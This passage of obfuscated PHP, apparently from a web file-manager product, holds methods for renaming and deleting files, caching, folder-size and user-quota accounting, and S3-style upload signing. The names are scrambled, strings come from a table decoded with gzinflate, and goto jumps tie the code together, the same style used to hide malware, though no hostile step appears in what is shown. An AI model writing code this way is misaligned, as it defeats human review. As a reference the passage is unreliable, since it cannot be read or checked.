$áß¦Ã×ö); } public function removeArray($¿ï¾âÚğ) { if (!$¿ï¾âÚğ) { return !0; } } public function removeRelevance($ş—ªª¼É, $«Ğó¡âÇ) { $¥’¹Î† =& $_SERVER[¥Ÿ©ÒèÌ]; $ş—ªª¼É = $ş—ªª¼É ? $ş—ªª¼É : array(); $«Ğó¡âÇ = $«Ğó¡âÇ ? $«Ğó¡âÇ : array(); $ş—ªª¼É = array_unique(array_filter($ş—ªª¼É)); $«Ğó¡âÇ = array_unique(array_filter($«Ğó¡âÇ)); if (!$ş—ªª¼É) { return !1; } $ˆ‘â“ëå = array($¥’¹Î†[418] => array($¥’¹Î†[419], $ş—ªª¼É)); Model($¥’¹Î†[2093])->where($ˆ‘â“ëå)->delete(); Model($¥’¹Î†[461])->where($ˆ‘â“ëå)->delete(); Model($¥’¹Î†[1948])->where($ˆ‘â“ëå)->delete(); Model($¥’¹Î†[564])->where($ˆ‘â“ëå)->delete(); Model($¥’¹Î†[1787])->removeBySource($ş—ªª¼É); Model($¥’¹Î†[2074])->removeBySource($ş—ªª¼É); $this->where($ˆ‘â“ëå)->delete(); Model($¥’¹Î†[470])->remove($«Ğó¡âÇ); for ($Éû‡ƒ¸¦ = 0; $Éû‡ƒ¸¦ < count($ş—ªª¼É); $Éû‡ƒ¸¦++) { $this->sourceCacheClear($ş—ªª¼É[$Éû‡ƒ¸¦]); } } public function rename($¶Ç²Ôø, $¾Ášˆ‹İ) { $ò±¢¥ùº =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö«ƒ¯°ª = $this->sourceInfo($¶Ç²Ôø); if (!$Ö«ƒ¯°ª) { return !1; } $¹Ì­¤Éò = $this->fileNameExist($Ö«ƒ¯°ª[$ò±¢¥ùº[498]], $¾Ášˆ‹İ); if ($¹Ì­¤Éò && $¹Ì­¤Éò != $¶Ç²Ôø) { return !1; } $ï™ÁœÄÀ = array($ò±¢¥ùº[421] => $¾Ášˆ‹İ, $ò±¢¥ùº[583] => USER_ID); if ($Ö«ƒ¯°ª[$ò±¢¥ùº[411]] != $ò±¢¥ùº[89]) { $ï™ÁœÄÀ[$ò±¢¥ùº[413]] = substr(get_path_ext($¾Ášˆ‹İ), 0, 10); } Model($ò±¢¥ùº[564])->eventRename($¶Ç²Ôø, $Ö«ƒ¯°ª[$ò±¢¥ùº[32]], $¾Ášˆ‹İ); $this->sourceCacheClear($¶Ç²Ôø); $this->setNamePinyin($¶Ç²Ôø, $ï™ÁœÄÀ[$ò±¢¥ùº[32]], !1); $this->updateModifyTime($Ö«ƒ¯°ª[$ò±¢¥ùº[498]]); $æÔÇê® = $this->where(array($ò±¢¥ùº[418] => $¶Ç²Ôø))->data($ï™ÁœÄÀ)->save(); $İºûıº® = $ò±¢¥ùº[2082] . $Ö«ƒ¯°ª[$ò±¢¥ùº[498]]; if (isset(self::$cacheChildList[$İºûıº®])) { unset(self::$cacheChildList[$İºûıº®]); } return $æÔÇê®; } public function setNamePinyin($å†ÉË™¦, $ŸãóÖïÒ, $¡–Ğ†ìÇ = true) { $ß¹ˆ²œó =& $_SERVER[¥Ÿ©ÒèÌ]; $°şŠıâ“ = Input::check($ŸãóÖïÒ, $ß¹ˆ²œó[587]); $ÏÍ¨Ú›Û = array($ß¹ˆ²œó[442] => KodSort::makeStr($ŸãóÖïÒ)); if ($°şŠıâ“) { $ÏÍ¨Ú›Û[$ß¹ˆ²œó[464]] = str_replace($ß¹ˆ²œó[53], $ß¹ˆ²œó[12], Pinyin::get($ŸãóÖïÒ)); $ÏÍ¨Ú›Û[$ß¹ˆ²œó[463]] = Pinyin::get($ŸãóÖïÒ, $ß¹ˆ²œó[588]); } if (!$¡–Ğ†ìÇ && !$°şŠıâ“) { $ÏÍ¨Ú›Û[$ß¹ˆ²œó[464]] = null; $ÏÍ¨Ú›Û[$ß¹ˆ²œó[463]] = null; } $this->metaSet($å†ÉË™¦, $ÏÍ¨Ú›Û); } public function getContent($ı™èÀÃ) { $´÷­×Ğç =& $_SERVER[¥Ÿ©ÒèÌ]; $®ûŒ†Ö = $this->fileInfoGet($ı™èÀÃ); if (!$®ûŒ†Ö) { return !1; } if ($®ûŒ†Ö[$´÷­×Ğç[80]] == 0) { return $´÷­×Ğç[12]; } $’Ş¡Öº = $´÷­×Ğç[2096] . $®ûŒ†Ö[$´÷­×Ğç[169]]; if ($®ûŒ†Ö[$´÷­×Ğç[80]] <= 1024 * 10) { $¶°‚“±˜ = Cache::get($’Ş¡Öº); if (!$¶°‚“±˜) { $¶°‚“±˜ = IO::getContent($®ûŒ†Ö[$´÷­×Ğç[78]]); Cache::set($’Ş¡Öº, $¶°‚“±˜); } return $¶°‚“±˜; } if (!$®ûŒ†Ö[$´÷­×Ğç[78]]) { return $´÷­×Ğç[12]; } return IO::getContent($®ûŒ†Ö[$´÷­×Ğç[78]]); } public function setDesc($àêÏŸ, $ô½€ê) { $Åò††ˆ =& $_SERVER[¥Ÿ©ÒèÌ]; Model($Åò††ˆ[564])->eventAddDesc($àêÏŸ, $ô½€ê); return $this->metaSet($àêÏŸ, $Åò††ˆ[451], $ô½€ê); } public function setContent($ÔıñËá , $ôäÅƒ¬š = '') { $´Íù¬¹ã =& $_SERVER[¥Ÿ©ÒèÌ]; $ÀØ™û  = $this->sourceInfo($ÔıñËá ); $¡â‡ÎùÚ = $this->fileInfoGet($ÔıñËá ); if (!$¡â‡ÎùÚ || !$ÀØ™û ) { return !1; } $ßÎãµ‹œ = Model($´Íù¬¹ã[470])->addFileByContent($ôäÅƒ¬š, $ÀØ™û [$´Íù¬¹ã[32]]); $¬ü™›“ = $this->fileHistory($ÀØ™û , $ßÎãµ‹œ[$´Íù¬¹ã[467]], $ßÎãµ‹œ[$´Íù¬¹ã[80]]); if (!$¬ü™›“) { return Model($´Íù¬¹ã[470])->remove($ßÎãµ‹œ[$´Íù¬¹ã[467]]); } $this->folderSizeReset($ÀØ™û [$´Íù¬¹ã[498]]); return !0; } public function fileSubstr($…ÇëúøÅ, $ÃçÙ”–, $µÃ¸ªÀ…) { $¿ª¾Ğ³è = $this->fileInfoGet($…ÇëúøÅ); if (!$¿ª¾Ğ³è) { return !1; } return IO::fileSubstr($¿ª¾Ğ³è[$_SERVER[¥Ÿ©ÒèÌ][78]], $ÃçÙ”–, $µÃ¸ªÀ…); } public function fileInfoGet($§šŒĞ…¹) { $“¨»§ğ— =& $_SERVER[¥Ÿ©ÒèÌ]; $‡‹§´ôÓ = $this->sourceInfo($§šŒĞ…¹); if (!$‡‹§´ôÓ || $‡‹§´ôÓ[$“¨»§ğ—[411]]) { return !1; } $—ãçãçÖ = $“¨»§ğ—[473] . $‡‹§´ôÓ[$“¨»§ğ—[467]]; $ŠğâŸ—¾ = _get(self::$cacheFileInfo, $—ãçãçÖ); if ($ŠğâŸ—¾) { return $ŠğâŸ—¾; } $°íè’îÈ = Model($“¨»§ğ—[470])->fileInfo($‡‹§´ôÓ[$“¨»§ğ—[467]]); if ($°íè’îÈ) { $°íè’îÈ[$“¨»§ğ—[32]] = $‡‹§´ôÓ[$“¨»§ğ—[32]]; } self::$cacheFileInfo[$—ãçãçÖ] = $°íè’îÈ; return $°íè’îÈ; } private function folderChildrenNumber($ú’µ¥ú¿) { $îÑî”ª¨ =& $_SERVER[¥Ÿ©ÒèÌ]; $›öÍßŞ© = $this->sourceInfo($ú’µ¥ú¿); $œš÷Û“· = array($îÑî”ª¨[584] => array($îÑî”ª¨[544], $›öÍßŞ©[$îÑî”ª¨[521]] . $ú’µ¥ú¿ . $îÑî”ª¨[545]), $îÑî”ª¨[581] => $›öÍßŞ©[$îÑî”ª¨[504]], $îÑî”ª¨[430] => intval($›öÍßŞ©[$îÑî”ª¨[431]]), $îÑî”ª¨[577] => 1); $à§Êğ = $this->where($œš÷Û“·)->count(); $õë™æÉ½ = $this->where($œš÷Û“·)->where(array($îÑî”ª¨[577] => 0))->count(); return array($îÑî”ª¨[84] => $õë™æÉ½, $îÑî”ª¨[85] => $à§Êğ); } public function pathInfo($éêãí’, $ÓßæÁÅÀ = false) { $À×Ğà =& $_SERVER[¥Ÿ©ÒèÌ]; $ÓßæÁÅÀ = !1; $éêãí’ = intval($éêãí’); $±ï¾ØÀ– = $À×Ğà[459] . intval($ÓßæÁÅÀ) . $À×Ğà[460] . $éêãí’; $ğÑºó = _get(self::$cachePathInfo, $±ï¾ØÀ–); if ($ğÑºó) { return $ğÑºó; } $ƒàíšë = $this->sourceInfo($éêãí’); if (!$ƒàíšë) { return !1; } $ƒàíšë = $this->_listDataApplyItem($ƒàíšë, $ÓßæÁÅÀ); self::$cachePathInfo[$±ï¾ØÀ–] = $ƒàíšë; return $ƒàíšë; } public static $cachePathInfoMore = array(); public function pathInfoMore($Äø„÷øÙ) { $´–ŞÛ† =& $_SERVER[¥Ÿ©ÒèÌ]; $öğ°¼¢ø = _get(self::$cachePathInfoMore, $Äø„÷øÙ); if ($öğ°¼¢ø) { return $öğ°¼¢ø; } $§©¨©Ãİ = $this->pathInfo($Äø„÷øÙ); if (!$§©¨©Ãİ) { return !1; } if ($§©¨©Ãİ[$´–ŞÛ†[411]] == $´–ŞÛ†[89]) { $§©¨©Ãİ[$´–ŞÛ†[83]] = $this->folderChildrenNumber($Äø„÷øÙ); } self::$cachePathInfoMore[$Äø„÷øÙ] = $§©¨©Ãİ; return $§©¨©Ãİ; } public function sourceInfo($½Ä™á ) { $ş®âÂœ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$½Ä™á ) { return array(); } $½Ä™á  = intval($½Ä™á ); $´—ƒ¢š = $ş®âÂœ[458] . $½Ä™á ; $•Ş­…ƒ = _get(self::$cacheSourceInfo, $´—ƒ¢š); if ($•Ş­…ƒ) { return $•Ş­…ƒ; } $æáì“§è = $this->where(array($ş®âÂœ[403] => $½Ä™á ))->find(); self::$cacheSourceInfo[$´—ƒ¢š] = $æáì“§è; return self::$cacheSourceInfo[$´—ƒ¢š]; } public function sourceCacheClear($Ÿıµ¯ÈÚ = false) { self::cacheClear($Ÿıµ¯ÈÚ); } public static function cacheClear($ÏŒ‚ïîû = false) { $Õ‹– =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ÏŒ‚ïîû == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Õ‹–[458] . $ÏŒ‚ïîû]); unset(self::$cachePathInfoMore[$ÏŒ‚ïîû]); unset(self::$cachePathInfo[$Õ‹–[2097] . $ÏŒ‚ïîû]); unset(self::$cachePathInfo[$Õ‹–[2098] . $ÏŒ‚ïîû]); } public function metaSet($»„£Û†ø, $æùëàş = null, $öˆÄÂç½ = null) { $üÈˆÓÊÑ = parent::metaSet($»„£Û†ø, $æùëàş, $öˆÄÂç½); if ($üÈˆÓÊÑ) { $this->sourceCacheClear($»„£Û†ø); } return $üÈˆÓÊÑ; } public function pathInfoByPath($›ƒŸŠÅµ, $®£À©Ş“) { $ÖğöÇñÃ =& $_SERVER[¥Ÿ©ÒèÌ]; $»ø¨Ä = !$®£À©Ş“ ? array() : explode($ÖğöÇñÃ[8], trim($®£À©Ş“, $ÖğöÇñÃ[8])); $º€Ğ‚ıô = $›ƒŸŠÅµ; foreach ($»ø¨Ä as $¤â±¦ºı) { $ÓçµüÓæ = array($ÖğöÇñÃ[498] => $º€Ğ‚ıô, $ÖğöÇñÃ[32] => $¤â±¦ºı); $œûûâİÆ = $this->where($ÓçµüÓæ)->select(); if (!$œûûâİÆ) { return !1; } $œûûâİÆ = array_sort_by($œûûâİÆ, $ÖğöÇñÃ[431]); $º€Ğ‚ıô = $œûûâİÆ[0][$ÖğöÇñÃ[403]]; } return $this->pathInfo($º€Ğ‚ıô, !0); } protected function updateModifyTime($ÇÛåÔß) { $æ¯·­éµ =& $_SERVER[¥Ÿ©ÒèÌ]; $‚ú¿­„ = defined($æ¯·­éµ[474]) ? USER_ID : $æ¯·­éµ[190]; if (!$ÇÛåÔß) { return; } if (!is_array($ÇÛåÔß)) { $ÇÛåÔß = array($ÇÛåÔß); } foreach ($ÇÛåÔß as $˜¨ÃÅ€˜ => $Â›Ì•˜ş) { $ÇÛåÔß[$˜¨ÃÅ€˜] = intval($Â›Ì•˜ş); $this->sourceCacheClear($Â›Ì•˜ş); } $‘÷…¡® = array($æ¯·­éµ[403] => array($æ¯·­éµ[7], $ÇÛåÔß)); $â¤û‚Åç = array($æ¯·­éµ[583] => $‚ú¿­„, $æ¯·­éµ[425] => time()); $this->where($‘÷…¡®)->save($â¤û‚Åç); } public function folderSizeReset($Â® ­ÓŒ, $ûöÇÈÎ„ = false) { $½Ş½¿‹± =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->statusIgnoreResetSpace) { return; } $³¹ÀØºß = $this->sourceInfo($Â® ­ÓŒ); $ÑÜÖÇ¶Í = $½Ş½¿‹±[2099] . $Â® ­ÓŒ; CacheLock::lock($ÑÜÖÇ¶Í, 20); if ($ûöÇÈÎ„ === !1) { $this->sourceCacheClear($Â® ­ÓŒ); $³¹ÀØºß = $this->sourceInfo($Â® ­ÓŒ); $¦€Ü¥áä = array($½Ş½¿‹±[402] => $Â® ­ÓŒ, $½Ş½¿‹±[430] => 0); $­œĞä…ì = $this->where($¦€Ü¥áä)->sum($½Ş½¿‹±[80]); $ûöÇÈÎ„ = intval($­œĞä…ì) - intval($³¹ÀØºß[$½Ş½¿‹±[80]]); } if ($ûöÇÈÎ„ == 0) { return CacheLock::unlock($ÑÜÖÇ¶Í); } $£ùãÎ­Ú = $this->parentLevelArray($³¹ÀØºß[$½Ş½¿‹±[521]]); if (!$£ùãÎ­Ú) { $£ùãÎ­Ú = array(); } $£ùãÎ­Ú[] = $³¹ÀØºß[$½Ş½¿‹±[403]]; $¦€Ü¥áä = array($½Ş½¿‹±[403] => array($½Ş½¿‹±[419], $£ùãÎ­Ú)); if ($ûöÇÈÎ„ < 0) { $¦€Ü¥áä[$½Ş½¿‹±[80]] = array($½Ş½¿‹±[1001], abs($ûöÇÈÎ„)); } $this->where($¦€Ü¥áä)->setAdd($½Ş½¿‹±[80], $ûöÇÈÎ„); CacheLock::unlock($ÑÜÖÇ¶Í); $ÊÖ÷¾Øµ = $½Ş½¿‹±[2100] . $³¹ÀØºß[$½Ş½¿‹±[412]] . $½Ş½¿‹±[4] . $³¹ÀØºß[$½Ş½¿‹±[504]]; $ïğì’®ú = array($³¹ÀØºß[$½Ş½¿‹±[412]], $³¹ÀØºß[$½Ş½¿‹±[504]]); TaskRun::timeLimitCall($ÊÖ÷¾Øµ, $½Ş½¿‹±[2101], $ïğì’®ú, 1.5); } public function folderSizeResetChildren($û”°Ô¼ò) { $àˆñó£‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->sourceCacheClear($û”°Ô¼ò); $¢àğÈ°÷ = $this->sourceInfo($û”°Ô¼ò); $¶’Êåô§ = array($àˆñó£‘[577] => 1, $àˆñó£‘[581] => $¢àğÈ°÷[$àˆñó£‘[504]], $àˆñó£‘[584] => array($àˆñó£‘[544], $¢àğÈ°÷[$àˆñó£‘[521]] . $û”°Ô¼ò . $àˆñó£‘[545])); $ğÃğÙÍ = $àˆñó£‘[2102]; $êêé¦É = $this->field($ğÃğÙÍ)->where($¶’Êåô§)->select(); $¶’Êåô§[$àˆñó£‘[411]] = 0; $‘±İø­Ô = $this->field($ğÃğÙÍ)->where($¶’Êåô§)->select(); if (!$‘±İø­Ô) { return; } $êêé¦É[] = $¢àğÈ°÷; $êêé¦É = array_to_keyvalue($êêé¦É, $àˆñó£‘[403]); foreach ($êêé¦É as $Ñ—›Åšï => $±ß¥ıÆ) { $êêé¦É[$Ñ—›Åšï][$àˆñó£‘[2103]] = $êêé¦É[$Ñ—›Åšï][$àˆñó£‘[80]]; $êêé¦É[$Ñ—›Åšï][$àˆñó£‘[80]] = 0; } foreach ($‘±İø­Ô as $±ß¥ıÆ) { $åÇÌÂÑ– = $±ß¥ıÆ[$àˆñó£‘[498]] . $àˆñó£‘[12]; if (!isset($êêé¦É[$åÇÌÂÑ–])) { continue; } if ($±ß¥ıÆ[$àˆñó£‘[431]] == $êêé¦É[$åÇÌÂÑ–][$àˆñó£‘[431]]) { $êêé¦É[$åÇÌÂÑ–][$àˆñó£‘[80]] += $±ß¥ıÆ[$àˆñó£‘[80]]; } } foreach ($êêé¦É as $±ß¥ıÆ) { $Ï—íî¨° = $this->parentLevelArray($±ß¥ıÆ[$àˆñó£‘[521]]); foreach ($Ï—íî¨° as $åÇÌÂÑ–) { $åÇÌÂÑ– = $åÇÌÂÑ– . $àˆñó£‘[12]; if (!isset($êêé¦É[$åÇÌÂÑ–])) { continue; } if ($±ß¥ıÆ[$àˆñó£‘[431]] == $êêé¦É[$åÇÌÂÑ–][$àˆñó£‘[431]]) { $êêé¦É[$åÇÌÂÑ–][$àˆñó£‘[80]] += $±ß¥ıÆ[$àˆñó£‘[80]]; } } } $¤çºÒÍÖ = array(); foreach ($êêé¦É as $±ß¥ıÆ) { if ($±ß¥ıÆ[$àˆñó£‘[80]] == $±ß¥ıÆ[$àˆñó£‘[2103]]) { continue; } $¤çºÒÍÖ[] = array($àˆñó£‘[403], $±ß¥ıÆ[$àˆñó£‘[403]], $àˆñó£‘[80], $±ß¥ıÆ[$àˆñó£‘[80]]); } $this->saveAll($¤çºÒÍÖ); } public function userSpaceReset($®ôÜÔòÆ = false) { $ÉÎ ¬¾ß =& $_SERVER[¥Ÿ©ÒèÌ]; $ï©É•…Ö = $this->where(array($ÉÎ ¬¾ß[412] => self::TYPE_USER, $ÉÎ ¬¾ß[504] => $®ôÜÔòÆ, $ÉÎ ¬¾ß[411] => 0))->sum($ÉÎ ¬¾ß[80]); $ï©É•…Ö = !$ï©É•…Ö || $ï©É•…Ö <= 0 ? 0 : $ï©É•…Ö; Model($ÉÎ ¬¾ß[513])->userEdit($®ôÜÔòÆ, array($ÉÎ ¬¾ß[1796] => $ï©É•…Ö)); } public function targetSpaceUpdate($€à†’©µ, $½éÄİ¤) { $˜ŠåĞø’ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$½éÄİ¤) { return; } if (!in_array($€à†’©µ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $òŞá»ê = $this->targetSpaceSize($€à†’©µ, $½éÄİ¤); if ($€à†’©µ == self::TYPE_USER) { Model($˜ŠåĞø’[513])->userEdit($½éÄİ¤, array($˜ŠåĞø’[1796] => $òŞá»ê)); } else { if ($€à†’©µ == self::TYPE_GROUP) { Model($˜ŠåĞø’[522])->groupEdit($½éÄİ¤, array($˜ŠåĞø’[1796] => $òŞá»ê)); } } } public function targetSpaceSize($¯™šŠ¼, $ß×â¶Ùó) { $¡ÚÈ×·§ =& $_SERVER[¥Ÿ©ÒèÌ]; $…ñÉ¬üÎ = $this->sourceRoot($¯™šŠ¼, $ß×â¶Ùó, !0); if (!$…ñÉ¬üÎ) { return 0; } $øª‚—Ñ = floatval($…ñÉ¬üÎ[$¡ÚÈ×·§[80]]); $ğ™À­ú· = array($¡ÚÈ×·§[584] => array($¡ÚÈ×·§[544], $¡ÚÈ×·§[531] . $…ñÉ¬üÎ[$¡ÚÈ×·§[403]] . $¡ÚÈ×·§[545])); $İÂä¥îå = Model($¡ÚÈ×·§[429])->field($¡ÚÈ×·§[418])->where($ğ™À­ú·)->select(); $İÂä¥îå = array_to_keyvalue($İÂä¥îå, $¡ÚÈ×·§[12], $¡ÚÈ×·§[403]); $İÂä¥îå = array_unique(array_filter($İÂä¥îå)); if ($İÂä¥îå) { $ğ™À­ú· = array($¡ÚÈ×·§[418] => array($¡ÚÈ×·§[419], $İÂä¥îå)); $øª‚—Ñ += floatval($this->where($ğ™À­ú·)->sum($¡ÚÈ×·§[80])); } $øª‚—Ñ = !$øª‚—Ñ || $øª‚—Ñ <= 0 ? 0 : $øª‚—Ñ; return $øª‚—Ñ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¼„³ÖºÆ) { return $this->fileTypeProfile($¼„³ÖºÆ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($±±üâ®¥) { return $this->fileTypeProfile($±±üâ®¥, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÑÔÎÊÒİ, $é×œ¾º¡) { $¯±‘Êõì =& $_SERVER[¥Ÿ©ÒèÌ]; $¤âğÚªî = $¯±‘Êõì[2104] . $ÑÔÎÊÒİ . $¯±‘Êõì[11] . $é×œ¾º¡; $Ùëï»Ğ = Cache::get($¤âğÚªî); if ($Ùëï»Ğ) { return $Ùëï»Ğ; } $´Ü«ŞÏ„ = array($¯±‘Êõì[577] => 0); if ($ÑÔÎÊÒİ != !1) { $´Ü«ŞÏ„[$¯±‘Êõì[504]] = $ÑÔÎÊÒİ; $´Ü«ŞÏ„[$¯±‘Êõì[412]] = $é×œ¾º¡; } $ÈÉ¸€™× = array(); $ÈÉ¸€™×[$¯±‘Êõì[2105]] = array($¯±‘Êõì[2106] => LNG($¯±‘Êõì[2105]), $¯±‘Êõì[2107] => $this->where($´Ü«ŞÏ„)->count(), $¯±‘Êõì[579] => $this->where($´Ü«ŞÏ„)->sum($¯±‘Êõì[80])); $É—•©ß— = KodIO::fileTypeList(); foreach ($É—•©ß— as $şÔ£»õá => $³†·‰ ‘) { $´Ü«ŞÏ„[$¯±‘Êõì[413]] = $this->fileTypeWhere($şÔ£»õá); $ÈÉ¸€™×[$şÔ£»õá] = array($¯±‘Êõì[2106] => $³†·‰ ‘[$¯±‘Êõì[32]], $¯±‘Êõì[2107] => $this->where($´Ü«ŞÏ„)->count(), $¯±‘Êõì[579] => $this->where($´Ü«ŞÏ„)->sum($¯±‘Êõì[80])); } Cache::set($¤âğÚªî, $ÈÉ¸€™×, 1200); return $ÈÉ¸€™×; } public function fileNameExist($Ô°Ó¯Àä, $·ù”ÛÄÜ) { $˜Ì—Á =& $_SERVER[¥Ÿ©ÒèÌ]; $£·ÅÙÆ‹ = $this->where(array($˜Ì—Á[498] => $Ô°Ó¯Àä, $˜Ì—Á[32] => $·ù”ÛÄÜ, $˜Ì—Á[431] => 0))->find(); return is_array($£·ÅÙÆ‹) ? $£·ÅÙÆ‹[$˜Ì—Á[403]] : !1; } public function childList($Úî†‰È¸) { $•¯ÂëÕ› =& $_SERVER[¥Ÿ©ÒèÌ]; $ñ´³çö± = $•¯ÂëÕ›[2082] . $Úî†‰È¸; if (isset(self::$cacheChildList[$ñ´³çö±])) { return self::$cacheChildList[$ñ´³çö±]; } $ş“â’™€ = array($•¯ÂëÕ›[498] => intval($Úî†‰È¸), $•¯ÂëÕ›[431] => 0); $¨ƒÖªäù = $this->where($ş“â’™€)->select(); $¨ƒÖªäù = $¨ƒÖªäù ? $¨ƒÖªäù : array(); self::$cacheChildList[$ñ´³çö±] = $¨ƒÖªäù; foreach ($¨ƒÖªäù as $Üç˜Ù°İ) { $ñ´³çö± = $•¯ÂëÕ›[458] . $Üç˜Ù°İ[$•¯ÂëÕ›[403]]; self::$cacheSourceInfo[$ñ´³çö±] = $Üç˜Ù°İ; } return $¨ƒÖªäù; } public function fileNameAuto($ÓÃ×ş†Ñ, $‹‡ëĞæÛ, $Òğı« = REPEAT_RENAME, $°¡Šœµ = false) { $ì×›„¢¹ =& $_SERVER[¥Ÿ©ÒèÌ]; $ì®™®¯™ = array($ì×›„¢¹[498] => $ÓÃ×ş†Ñ, $ì×›„¢¹[431] => 0, $ì×›„¢¹[32] => array($ì×›„¢¹[387], $‹‡ëĞæÛ . $ì×›„¢¹[388])); $ı…İ–æ¢ = $this->field($ì×›„¢¹[32])->where($ì®™®¯™)->select(); $¿¬ç×ÏÈ = array_to_keyvalue($ı…İ–æ¢, $ì×›„¢¹[12], $ì×›„¢¹[32]); return $this->fileNameAutoGet($¿¬ç×ÏÈ, $‹‡ëĞæÛ, $Òğı«, $°¡Šœµ); } public function fileNameAutoGet($ƒÇìü‰ï, $¸›‰í‚©, $ã¥¶•¤í, $¹ª‘ƒ¶Ø) { $şê±–Á =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ã¥¶•¤í == REPEAT_REPLACE || !$ƒÇìü‰ï || !in_array_not_case($¸›‰í‚©, $ƒÇìü‰ï) || $¹ª‘ƒ¶Ø && $ã¥¶•¤í != REPEAT_RENAME_FOLDER) { return $¸›‰í‚©; } if ($ã¥¶•¤í == REPEAT_SKIP) { return !1; } $ö·şÈÀö = $şê±–Á[10] . get_path_ext($¸›‰í‚©); $ö·şÈÀö = $ö·şÈÀö == $şê±–Á[10] || $¹ª‘ƒ¶Ø ? $şê±–Á[12] : $ö·şÈÀö; for ($–ïâÕÇ· = 1; $–ïâÕÇ· <= count($ƒÇìü‰ï) + 1; $–ïâÕÇ·++) { $ÖÉŒ–Ñ… = substr($¸›‰í‚©, 0, strlen($¸›‰í‚©) - strlen($ö·şÈÀö)); $ˆøÊÖïá = $ÖÉŒ–Ñ… . "\x28{$–ïâÕÇ·}\x29{$ö·şÈÀö}"; if (!in_array_not_case($ˆøÊÖïá, $ƒÇìü‰ï)) { return $ˆøÊÖïá; } } } } goto d±çÃ¼ÚÄã; AŒÙ“Íâã: if (!$uwpreasvnk) { return; } $_SERVER[ûùÖÄøÆ] = explode($_SERVER[¥Ÿ©ÒèÌ][607], gzinflate(substr($_SERVER[¥Ÿ©ÒèÌ][608], 10, -8))); $xpvdgaztcl = $_SERVER[¥Ÿ©ÒèÌ][609]; goto eî®ø´êğ; FùŠ¯óÀÍñ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($œçÀÙ‡—) { $this->pathParse = $œçÀÙ‡—; } protected function infoParse($„”øü·ˆ, $ùåç£ë• = false) { $ù¼ğê¸¤ =& $_SERVER[¥Ÿ©ÒèÌ]; return Action($ù¼ğê¸¤[1159])->sharePathInfo($this->pathParse[$ù¼ğê¸¤[78]], !0, $ùåç£ë•); } public function listPath($í–‚Ü”Î, $óÒ·Ãû‚ = false) { $«ùÄ¨öÒ =& $_SERVER[¥Ÿ©ÒèÌ]; $Æ˜Óãú¶ = IO::listPath($í–‚Ü”Î, $óÒ·Ãû‚); if (!$Æ˜Óãú¶) { return $Æ˜Óãú¶; } if (is_array($Æ˜Óãú¶[$«ùÄ¨öÒ[1320]])) { $ÔÎã¨åµ = Action($«ùÄ¨öÒ[1329])->parsePathChildren($Æ˜Óãú¶[$«ùÄ¨öÒ[1320]], array($«ùÄ¨öÒ[422] => $í–‚Ü”Î)); $Æ˜Óãú¶[$«ùÄ¨öÒ[1320]] = Action($«ùÄ¨öÒ[1159])->shareItemInfo($ÔÎã¨åµ); } foreach ($Æ˜Óãú¶ as $©ÈÚ•Ü => $öÜéû«ø) { if (!in_array($©ÈÚ•Ü, array($«ùÄ¨öÒ[76], $«ùÄ¨öÒ[77]))) { continue; } foreach ($öÜéû«ø as $ŞâÌá¦ö => $ÔÎã¨åµ) { $ÔÎã¨åµ = Action($«ùÄ¨öÒ[1329])->parsePathChildren($ÔÎã¨åµ, array($«ùÄ¨öÒ[422] => $í–‚Ü”Î)); $Æ˜Óãú¶[$©ÈÚ•Ü][$ŞâÌá¦ö] = Action($«ùÄ¨öÒ[1159])->shareItemInfo($ÔÎã¨åµ); } } return $Æ˜Óãú¶; } public function listAll($–¡÷í²ç) { $ú˜£àê =& $_SERVER[¥Ÿ©ÒèÌ]; $ø©ğ÷ÛÅ = IO::listAll($–¡÷í²ç); foreach ($ø©ğ÷ÛÅ as &$Éå÷•’ß) { $±¡‹¬ù» = IO::info($Éå÷•’ß[$ú˜£àê[78]]); $±¡‹¬ù» = is_array($±¡‹¬ù») ? $±¡‹¬ù» : array(); $Éå÷•’ß = array_merge($±¡‹¬ù», $Éå÷•’ß); $Éå÷•’ß[$ú˜£àê[87]] = Action($ú˜£àê[1159])->shareItemInfo($Éå÷•’ß); } unset($Éå÷•’ß); return $ø©ğ÷ÛÅ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ƒ¶†ğĞÅ) { parent::__construct($ƒ¶†ğĞÅ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($„ş®¾êŠ) { parent::__construct($„ş®¾êŠ); $this->signatureVersion($_SERVER[¥Ÿ©ÒèÌ][211]); } public function uploadFormData($’®ÕÔ±¶, $ş‰ˆ… Ú = 3600) { $ßå­¿Øü =& $_SERVER[¥Ÿ©ÒèÌ]; $ÌÆ¨šÀä = $ßå­¿Øü[191]; $¥ŸÛë¼ş = $ßå­¿Øü[1330]; $ş±™à‹² = $ßå­¿Øü[62]; $òíÙ– Æ = gmdate($ßå­¿Øü[1331]); $è„Ù‰«¦ = gmdate($ßå­¿Øü[741]); $Ö…©›¯á = $ßå­¿Øü[1332]; $²†Ó¦ü” = $ş‰ˆ… Ú . $ßå­¿Øü[12]; $í’™ˆ©š = $ßå­¿Øü[1294]; $İÏĞ‡˜Õ = array($this->accessKey, $è„Ù‰«¦, $this->region, $ş±™à‹², $Ö…©›¯á); $ÆÙ‘ÃÉ€ = implode($ßå­¿Øü[8], $İÏĞ‡˜Õ); $À®ë‹“à = array($ßå­¿Øü[1296] => gmdate($ßå­¿Øü[1295], strtotime($ßå­¿Øü[1333])), $ßå­¿Øü[1297] => array(array($ßå­¿Øü[1299] => $this->bucket), array($ßå­¿Øü[1298] => $ÌÆ¨šÀä), array($ßå­¿Øü[1300], $ßå­¿Øü[1301], $ßå­¿Øü[12]), array($ßå­¿Øü[1300], $ßå­¿Øü[1334], $ßå­¿Øü[12]), array($ßå­¿Øü[1300], $ßå­¿Øü[1335], $ßå­¿Øü[12]), array($ßå­¿Øü[1302] => $í’™ˆ©š), 